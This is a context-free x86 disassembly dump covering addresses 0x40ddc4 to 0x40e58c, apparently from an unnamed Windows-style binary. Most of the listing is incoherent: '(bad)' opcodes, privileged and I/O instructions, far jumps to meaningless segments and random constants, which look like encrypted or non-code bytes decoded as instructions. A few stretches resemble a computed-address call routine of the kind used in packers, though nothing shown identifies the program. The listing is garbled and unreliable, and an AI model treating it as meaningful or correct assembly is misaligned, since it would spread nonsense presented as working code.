  40ddc4:	fs jmp 0xeff6:0x20ef9730
  40ddcc:	xor    eax,0x98e6b306
  40ddd1:	pop    esi
  40ddd2:	js     0x40dd8d
  40ddd4:	jge    0x40dda2
  40ddd6:	inc    ebx
  40ddd7:	ja     0x40dd85
  40ddd9:	pop    es
  40ddda:	mov    ecx,0x4109d535
  40dddf:	mov    ch,0xfe
  40dde1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dde2:	sub    al,0xfe
  40dde4:	cmp    BYTE PTR [ecx+0x77e947ce],ch
  40ddea:	into   
  40ddeb:	gs mov edi,eax
  40ddee:	jecxz  0x40de0d
  40ddf0:	push   ecx
  40ddf1:	mov    edx,0x816c5914
  40ddf6:	int3   
  40ddf7:	dec    eax
  40ddf8:	icebp  
  40ddf9:	pop    edi
  40ddfa:	in     al,0xeb
  40ddfc:	icebp  
  40ddfd:	xchg   ecx,eax
  40ddfe:	test   DWORD PTR [ebp-0x5edfd09b],ecx
  40de04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de05:	cli    
  40de06:	es mov esi,0xcd117d1d
  40de0c:	sahf   
  40de0d:	adc    bh,BYTE PTR [ebx-0x71]
  40de10:	fmul   QWORD PTR [edi+0x4589d8ca]
  40de16:	or     BYTE PTR [ebx+0x558be845],cl
  40de1c:	adc    al,0x33
  40de1e:	rol    DWORD PTR [ebx],0xc6
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx-0x6e00d7d2],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40deeb
  40de8e:	xchg   esp,eax
  40de8f:	gs sbb eax,0xc6cefc8f
  40de95:	jae    0x40de89
  40de97:	repnz mov ecx,0x410dc6d9
  40de9d:	hlt    
  40de9e:	add    BYTE PTR [edi],dh
  40dea0:	add    ch,al
  40dea2:	jp     0x40df0e
  40dea4:	jnp    0x40dec6
  40dea6:	cmp    ebx,edx
  40dea8:	cmp    edi,DWORD PTR [eax+0x7646beeb]
  40deae:	ret    0x8349
  40deb1:	dec    eax
  40deb2:	adc    al,0x6d
  40deb4:	mov    fs,WORD PTR [ecx-0x3498d078]
  40deba:	sti    
  40debb:	je     0x40de8a
  40debd:	fisttp QWORD PTR [edi]
  40debf:	xor    esi,DWORD PTR [ecx-0x6e]
  40dec2:	in     al,0xf5
  40dec4:	inc    edi
  40dec5:	popa   
  40dec6:	imul   edx,DWORD PTR [ecx+0x136365a0],0xc3f3472c
  40ded0:	mov    al,0xa9
  40ded2:	jbe    0x40debd
  40ded4:	hlt    
  40ded5:	jmp    0x40dece
  40ded7:	mov    ebx,0xedaeac19
  40dedc:	leave  
  40dedd:	add    eax,0x1b610b05
  40dee2:	rol    BYTE PTR [eax-0x65],1
  40dee5:	les    eax,FWORD PTR [eax-0x1e6f467e]
  40deeb:	in     al,0xa8
  40deed:	and    DWORD PTR [ecx],ebx
  40deef:	jmp    0xe39c:0xe771e0d7
  40def6:	les    eax,FWORD PTR [ebp+eiz*4-0x73]
  40defa:	sub    ah,0x2e
  40defd:	jp     0x40ded4
  40deff:	(bad)  
  40df00:	popf   
  40df01:	and    BYTE PTR [ebx],bl
  40df03:	cmp    eax,0x16ffecf0
  40df08:	push   cs
  40df09:	stc    
  40df0a:	sub    al,0x65
  40df0c:	imul   eax,DWORD PTR [ecx],0xffffffd1
  40df0f:	hlt    
  40df10:	in     al,0x62
  40df12:	mov    ebx,0x742d264c
  40df17:	xor    eax,0x65ac56b9
  40df1c:	or     bl,BYTE PTR [edi]
  40df1e:	fsub   QWORD PTR [esi]
  40df20:	(bad)  [edi+0x26]
  40df23:	push   edi
  40df24:	mov    DWORD PTR [ebx-0x2b],eax
  40df27:	inc    dx
  40df29:	xchg   ebx,eax
  40df2a:	mov    dh,0x4b
  40df2c:	cmc    
  40df2d:	xchg   edx,eax
  40df2e:	inc    ebp
  40df2f:	mov    ecx,ebx
  40df31:	ret    
  40df32:	rcr    BYTE PTR [esi],0x21
  40df35:	or     edx,esi
  40df37:	or     DWORD PTR [esi-0x5b],0x18
  40df3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df3c:	xor    ch,BYTE PTR [ecx]
  40df3e:	sub    eax,0x14965263
  40df43:	xchg   BYTE PTR [edi*1+0x4e833a2b],bh
  40df4a:	jle    0x40df85
  40df4c:	mov    al,0x88
  40df4e:	xor    BYTE PTR [esp+edi*4-0x26],0x13
  40df53:	popf   
  40df54:	adc    bl,ch
  40df56:	cmp    al,0xcd
  40df58:	jae    0x40dfb2
  40df5a:	jbe    0x40defa
  40df5c:	mov    ebp,0x9c92e4cb
  40df61:	lds    edx,FWORD PTR [edi-0x2b]
  40df64:	jno    0x40df2a
  40df66:	test   al,0xe3
  40df68:	mov    edi,0x7ee03b2d
  40df6d:	je     0x40dfe6
  40df6f:	fdivr  st,st(4)
  40df71:	ret    
  40df72:	int3   
  40df73:	adc    DWORD PTR [ebp+0x62679427],esi
  40df79:	cmp    DWORD PTR [esi+0x24aa8818],0xafebae5b
  40df83:	in     eax,dx
  40df84:	int    0xe1
  40df86:	pop    ebp
  40df87:	mov    esi,0xd77ce288
  40df8c:	mov    bh,0xd7
  40df8e:	sbb    ebx,DWORD PTR [edi-0x23]
  40df91:	xchg   BYTE PTR [eax],ch
  40df93:	inc    BYTE PTR [ecx-0x6e9351a1]
  40df99:	retf   
  40df9a:	pop    ebx
  40df9b:	xchg   esi,eax
  40df9c:	add    edi,DWORD PTR [eax+0x14]
  40df9f:	in     eax,dx
  40dfa0:	cs xchg esi,eax
  40dfa2:	mov    BYTE PTR [ecx+0xc588439],cl
  40dfa8:	repz xor eax,0xe8b23f67
  40dfae:	cmp    al,0x33
  40dfb0:	int    0xf0
  40dfb2:	sbb    edi,eax
  40dfb4:	in     al,dx
  40dfb5:	ins    BYTE PTR es:[edi],dx
  40dfb6:	sub    DWORD PTR [ebp-0x35],ecx
  40dfb9:	inc    ebx
  40dfba:	xchg   ebx,ecx
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
